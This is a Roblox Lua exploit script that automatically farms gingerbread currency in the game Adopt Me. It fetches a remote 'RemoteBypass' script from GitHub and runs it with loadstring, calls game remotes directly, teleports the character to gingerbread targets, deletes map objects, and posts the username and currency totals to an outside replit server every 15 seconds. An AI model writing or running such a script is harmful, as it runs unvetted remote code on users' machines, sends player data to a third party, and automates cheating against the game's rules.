local TeleportService = game:GetService("TeleportService")
local player = game.Players.LocalPlayer


if game.PlaceId ~= 920587237 then
while true do
    TeleportService:Teleport(920587237, player)
wait(10)
end
end

local function getHumanoidRootPart()
    local char = player.Character or player.CharacterAdded:Wait()
    return char:FindFirstChild("HumanoidRootPart")
end
local function BodyVelocity()
    while true do
        task.wait(0.1)
        local humanoidRootPart = getHumanoidRootPart()
        if humanoidRootPart then
            local BV = humanoidRootPart:FindFirstChild("BodyVelocity") or Instance.new("BodyVelocity", humanoidRootPart)
            BV.Velocity = Vector3.new(0, 0.001, 0)
            BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        end
    end
end

wait(10)
local function remotescript()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
end
spawn(remotescript)
wait(2)
local args = {
    [1] = "Parents",
    [2] = {
        ["source_for_logging"] = "intro_sequence"
    }
}

game:GetService("ReplicatedStorage").API:FindFirstChild("TeamAPI/ChooseTeam"):InvokeServer(unpack(args))
wait(10)
local args = {
    [1] = game:GetService("Players").LocalPlayer,
    [2] = true
}

game:GetService("ReplicatedStorage").API:FindFirstChild("HousingAPI/UnsubscribeFromHouse"):InvokeServer(unpack(args))
wait(5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
character.HumanoidRootPart.CFrame = CFrame.new(-12009, 11529, -15935)
character.Humanoid.WalkToPoint = Vector3.new(-12009, 11529, -15900)
repeat wait(1) until (character.HumanoidRootPart.Position - Vector3.new(-254, 30, -1813)).Magnitude <= 100
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

humanoidRootPart.CFrame = CFrame.new(-253, 30, -1788)
humanoidRootPart.CFrame = CFrame.new(-253, 30, -1788)

spawn(BodyVelocity)
local GingerAmount = 0

local function GingerbreadAmount()
    while true do
        local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
        if playerGui then
            local altCurrency = playerGui:FindFirstChild("AltCurrencyIndicatorApp")
            if altCurrency then
                local currencyIndicator = altCurrency:FindFirstChild("CurrencyIndicator")
                if currencyIndicator then
                    local container = currencyIndicator:FindFirstChild("Container")
                    if container then
                        local amount = container:FindFirstChild("Amount")
                        if amount and amount:IsA("TextLabel") then
                            -- Remove commas from the string and store it as an integer
                            local amountText = amount.Text
                            amountText = amountText:gsub(",", "") -- Remove commas
                            GingerAmount = tonumber(amountText) or 0 -- Convert to number, default to 0 if not a valid number
                        
                        end
                    end
                end
            end
        end
        wait(2)
    end
end

spawn(GingerbreadAmount)



local function WebsiteDataUpdate()
    while true do

        local Player = game.Players.LocalPlayer
        local player = Player.Name
        local ServerID = game.JobId
        local Http = game:GetService("HttpService")

        local request = (syn and syn.request) or request or (http and http.request) or http_request

        -- Ensure all variables have default values (0) if they are nil
        -- Updated URL
        local response = request({
            Url = 'https://bots-juzzoualive.replit.app/update',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = Http:JSONEncode({
                Username = player,
                VoidTicketsValue = "0", -- Use fixed VoidTicketsValue
                DiamondsValue = GingerAmount,
                HugeList = "0",
                Server = "0",
InstaplantValue = "0",
SeedbagValue = "0",
DiamondsSeedValue = "0"

            })
        })

        wait(15)
    end
end

spawn(WebsiteDataUpdate)  
local function redeem()
while true do
game:GetService("ReplicatedStorage").API:FindFirstChild("WinterEventAPI/RedeemPendingGingerbread"):FireServer()
wait(1)
end
end
spawn(redeem)

local function MapDestroy()
while true do
for _, child in ipairs(game.Workspace:GetChildren()) do
    if child:IsA("Model") then
        
    elseif child.Name == "Interiors" then
        local mainMap = child:FindFirstChild("MainMap!WinterSnow")
        if mainMap then
            for _, mainMapChild in ipairs(mainMap:GetChildren()) do
                if mainMapChild.Name == "Static" then
                    for _, staticChild in ipairs(mainMapChild:GetChildren()) do
                        if staticChild.Name ~= "Terrain" then
                            staticChild:Destroy()
                        end
                    end
                elseif mainMapChild.Name ~= "GingerbreadRig" and mainMapChild.Name ~= "GingerbreadPileMedium" then
                    mainMapChild:Destroy()
                end
            end
        end
    end
end

wait()
end
end
spawn(MapDestroy)

while true do
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local tweenService = game:GetService("TweenService")

    local function getClosest(targets)
        local closest, shortestDistance = nil, math.huge
        for _, target in ipairs(targets) do
            local distance = (humanoidRootPart.Position - target.Position).Magnitude
            if distance < shortestDistance then
                closest = target
                shortestDistance = distance
            end
        end
        return closest
    end

    local function tweenToPosition(endPosition, speed)
        local distance = (humanoidRootPart.Position - endPosition).Magnitude
        local time = distance / speed
        local tween = tweenService:Create(humanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = CFrame.new(endPosition)})
        tween:Play()
        tween.Completed:Wait()
    end

    local mainMap = game.Workspace.Interiors:FindFirstChild("MainMap!WinterSnow")

    if mainMap then
        local targets = {}
        for _, child in ipairs(mainMap:GetChildren()) do
            if child:IsA("Model") and child:FindFirstChild("GingerbreadMan") then
                table.insert(targets, child.GingerbreadMan)
            end
        end

        while #targets > 0 do
            local closest = getClosest(targets)
            if closest then
                local targetPosition = closest.Position
                local distanceToTarget = (humanoidRootPart.Position - targetPosition).Magnitude
                
                if distanceToTarget > 80 then
                    local randomPosition = targetPosition + Vector3.new(math.random(-5, 5), 0, math.random(-5, 5))
                    humanoidRootPart.CFrame = CFrame.new(randomPosition)
                end

                tweenToPosition(targetPosition, 90)
                table.remove(targets, table.find(targets, closest))
            end
        end
    end
    wait()
end
